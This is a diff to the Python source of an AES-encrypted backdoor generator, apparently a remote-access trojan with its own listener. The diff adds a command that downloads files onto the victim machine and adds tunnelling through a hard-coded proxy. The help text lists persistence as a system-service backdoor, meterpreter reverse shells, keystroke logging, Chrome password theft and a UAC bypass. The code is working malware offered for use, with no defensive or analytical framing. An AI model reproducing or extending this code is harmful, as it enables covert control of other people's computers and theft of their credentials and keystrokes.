@@ -38,6 +38,12 @@ part1 = '''#def fscreenshot():
 # 	win32gui.DeleteObject(saveBitMap.GetHandle())
 # 	return bmpname
 
+def Wget(file):
+	down = urllib2.urlopen(file)
+	filename = file.split('/')[-1]
+	with open(pwd + os.sep + filename,'wb') as o:
+		o.write(down.read())
+
 def MeterDrop(mhost, mport):
 	try:
 		global DropSock
@@ -236,6 +242,18 @@ else:
 	pwdvar = 'pwd'
 	success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFEOUH%s' % (paddedopsys, starpadding))
 
+                               # HTTP PROXY SETTINGS - proxies can only be HTTP/S !
+useproxy = False               # Set to True to use the proxy.
+proxyhost = "37.187.58.37"     # Set to the hostname (IP) of the proxy.
+proxyport = 3128               # Set to the port of the proxy.
+
+if useproxy:
+	s = socks.socksocket()
+	s.setproxy(socks.HTTP,proxyhost,proxyport)
+	success = "GET / HTTP/1.1**r**n**r**n" + success
+else:
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
 s.connect((host, port))
 s.send(success)
 pwd = fsubprocess(pwdvar).strip('**n').strip('**r')
@@ -244,6 +262,7 @@ while 1:
 	data = s.recv(2048)
 	decrypted = DecodeAES(cipher, data)
 	if decrypted == "quit" or decrypted == "exit":
+		s.close()
 		break
 
 	# elif decrypted.startswith('screenshot'):
@@ -361,6 +380,15 @@ while 1:
 			encrypted = EncodeAES(cipher, "EOFEOFEOFEOFEOFSEOFEOFEOFEOFEOFS" + f.read() + "EOFEOFEOFEOFEOFZEOFEOFEOFEOFEOFZ")
 		s.send(encrypted)
 
+	elif decrypted.startswith("wget "):
+		try:
+			file = decrypted.split(' ')[1]
+			Wget(file)
+			encrypted = EncodeAES(cipher, " [*] %s downloaded.**nEOFEOFEOFEOFEOFX" % (file.split('/')[-1]))
+		except Exception as e:
+			encrypted = EncodeAES(cipher, " [X] Could not find %s.**nEOFEOFEOFEOFEOFX" % (e))
+		s.send(encrypted)
+
 	elif decrypted.startswith("EOFEOFEOFEOFEOFS"):
 		ufilename = pwd.strip('**r') + os.sep + decrypted[16:32].strip('*')
 		f = open(ufilename, 'wb')
@@ -424,7 +452,7 @@ encrypted = EncodeAES(cipherEnc, readyscript)
 b64var = randVar()
 aesvar = 'AES'
 f.write('''#!/usr/bin/env python
-import subprocess,platform,socket,base64,os,struct,socket,binascii,ctypes,time,threading,string,sqlite3;from Crypto import Random;from Crypto.Cipher import AES;from base64 import b64decode as %s
+import subprocess,platform,socket,base64,os,struct,socket,socks,urllib2,binascii,ctypes,time,threading,string,sqlite3;from Crypto import Random;from Crypto.Cipher import AES;from base64 import b64decode as %s
 try:
 	import win32api,win32gui,win32file,win32console,win32crypt,pyHook,pythoncom,win32con
 except:
@@ -452,8 +480,12 @@ def bypassuac(cmd):
 def fnextcmd():
 	global nextcmd, downfile, upfile
 	nextcmd = False
-	while not nextcmd:
-		nextcmd = raw_input("[AES-shell]>")
+	try:
+		while not nextcmd:
+			nextcmd = raw_input("[AES-shell]>")
+	except:
+		print
+		exit()
 
 	if nextcmd.startswith('bypassuac'):
 		if isSystem:
@@ -540,9 +572,9 @@ def fmainloop(first):
 				continue
 
 def fhelp():
-	return '**n AES-shell options:**n  download file       -  Download a file from remote pwd to localhost.**n  upload filepath     -  Upload a filepath to remote pwd.**n  run commands        -  Run a command in the background.**n**n Windows Only:**n  persistence         -  Install exe as a system service backdoor**n  meterpreter ip:port -  Execute a reverse_tcp meterpreter to ip:port.**n  keyscan             -  Start recording keystrokes.**n  keydump             -  Dump recorded keystrokes.**n  keyclear            -  Clear the keystroke buffer.**n  chromepass          -  Retrieve chrome stored passwords.**n  bypassuac cmds      -  Run commands as admin.**n'
+	return '**n AES-shell options:**n  download file       -  Download a file from remote pwd to localhost.**n  upload filepath     -  Upload a filepath to remote pwd.**n  run commands        -  Run a command in the background.**n  wget url            -  Download a file from url to pwd.**n**n Windows Only:**n  persistence         -  Install exe as a system service backdoor.**n  meterpreter ip:port -  Execute a reverse_tcp meterpreter to ip:port.**n  keyscan             -  Start recording keystrokes.**n  keydump             -  Dump recorded keystrokes.**n  keyclear            -  Clear the keystroke buffer.**n  chromepass          -  Retrieve chrome stored passwords.**n  bypassuac cmds      -  Run commands as admin.**n'
 
-commands = ['download ', 'upload ', 'meterpreter ', 'keyscan', 'keydump', 'keyclear', 'run ', 'chromepass', 'help', 'bypassuac', 'persistence']
+commands = ['download ', 'upload ', 'meterpreter ', 'keyscan', 'keydump', 'keyclear', 'run ', 'chromepass', 'help', 'bypassuac ', 'persistence', 'wget ']
 readline.parse_and_bind("tab: complete")
 readline.set_completer(completer)
 BLOCK_SIZE, PADDING = 32, '{'
@@ -550,21 +582,25 @@ pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
 EncodeAES = lambda c, s: base64.b64encode(c.encrypt(s))
 DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e))
 secret, listenport = "***SECRET***", ***PORT***
-isAdmin, is64, isSystem = False, False, False
+isAdmin, is64, isSystem, isProxied = False, False, False, False
 iv = Random.new().read(AES.block_size)
 cipher = AES.new(secret,AES.MODE_CFB, iv)
 c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 c.bind(('0.0.0.0', int(listenport)))
 c.listen(128)
+c.settimeout(25)
 
 fmainloop(True)
 
 while True:
 	try:
 		data = s.recv(2048)
+		if data.startswith("GET / HTTP/1.1**r**n**r**n"):
+			data = data[18:]
+			isProxied = True
 		decrypted = DecodeAES(cipher, data)
-	except:
-		pass
+	except Exception as e:
+		print str(e)
 	if decrypted.endswith("EOFEOFEOFEOFEOFX"):
 		print decrypted[:-16]
 		fnextcmd()
@@ -590,7 +626,10 @@ while True:
 			else:
 				uservar = 'not Admin'
 
-		print ' [*] AES-Encrypted connection established with %s:%s' % (address[0], address[1])
+		if isProxied:
+			print ' [*] AES-Encrypted connection established with %s:%s (Proxy)' % (address[0], address[1])
+		else:
+			print ' [*] AES-Encrypted connection established with %s:%s' % (address[0], address[1])
 		print ' [*] User is %s, System is %s %s.**n' % (uservar, archvar, opsys)
 		fnextcmd()
 
@@ -615,12 +654,16 @@ while True:
 	else:
 		if decrypted:
 			print decrypted
-
-	if nextcmd == 'exit' or nextcmd == 'quit':
+	try:
+		if nextcmd == 'exit' or nextcmd == 'quit':
+			c.close()
+			break
+	except:
+		c.close()
 		break
 '''
 se = open(serverName, 'wb')
-finalserver = rawserv.replace('**n', '\\n').replace('***SECRET***', secretkey).replace('***PORT***', portnumber)
+finalserver = rawserv.replace('**n', '\\n').replace('**r', '\\r').replace('***SECRET***', secretkey).replace('***PORT***', portnumber)
 se.write(finalserver)
 se.close()
 os.system('chmod +x %s %s' % (backdoorName, serverName))
